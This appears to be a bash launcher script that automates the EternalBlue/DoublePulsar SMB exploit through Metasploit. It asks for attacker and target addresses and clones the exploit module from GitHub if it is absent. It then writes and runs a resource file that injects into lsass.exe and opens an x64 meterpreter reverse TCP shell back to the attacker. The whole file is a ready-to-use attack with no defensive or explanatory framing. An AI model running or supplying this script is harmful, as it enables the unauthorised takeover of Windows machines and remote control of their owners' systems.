#!/bin/bash
echo "        ▄▄  ▄▄▄▄▄▄▄▄                                ▄▄        ▄▄       
      ██        ██   ▀▀▀▀▀███                        ██       █▄        █▄      
     ██        ██        ██▀    ▄████▄    ██▄████  ███████     █▄        █▄     
    ██        ██       ▄██▀    ██▄▄▄▄██   ██▀        ██         █▄        █▄    
   ▄█▀       ▄█▀      ▄██      ██▀▀▀▀▀▀   ██         ██          █▄        █▄   
  ▄█▀       ▄█▀      ███▄▄▄▄▄  ▀██▄▄▄▄█   ██         ██▄▄▄        █▄        █▄  
 ▄█▀       ▄█▀       ▀▀▀▀▀▀▀▀    ▀▀▀▀▀    ▀▀          ▀▀▀▀         █▄        █▄ 
"
read -p 'LHOST= ' lhost
read -p 'RHOST= ' rhost
cd ..
   if [ -d Eternalblue-Doublepulsar-Metasploit ]; then
   cd Eternalblue-Doublepulsar-Metasploit
   mv eternalblue_doublepulsar.rb /usr/share/metasploit-framework/modules/exploits/windows/smb/
   echo "use exploit/windows/smb/eternalblue_doublepulsar 
   set processinject lsass.exe
   set targetarchitecture x64
   set payload windows/x64/meterpreter/reverse_tcp
   set rhost" $rhost > eternalblue_doublepulsar.rc
   echo "set lhost" $lhost >> eternalblue_doublepulsar.rc
   echo "exploit" >> eternalblue_doublepulsar.rc
   xterm -e "msfconsole -r eternalblue_doublepulsar.rc"
   else
   git clone https://github.com/ElevenPaths/Eternalblue-Doublepulsar-Metasploit.git
   cd Eternalblue-Doublepulsar-Metasploit
   mv eternalblue_doublepulsar.rb /usr/share/metasploit-framework/modules/exploits/windows/smb/
   echo "use exploit/windows/smb/eternalblue_doublepulsar 
   set processinject lsass.exe
   set targetarchitecture x64
   set payload windows/x64/meterpreter/reverse_tcp
   set rhost" $rhost > eternalblue_doublepulsar.rc
   echo "set lhost" $lhost >> eternalblue_doublepulsar.rc
   echo "exploit" >> eternalblue_doublepulsar.rc
   xterm -e "msfconsole -r eternalblue_doublepulsar.rc"
   fi
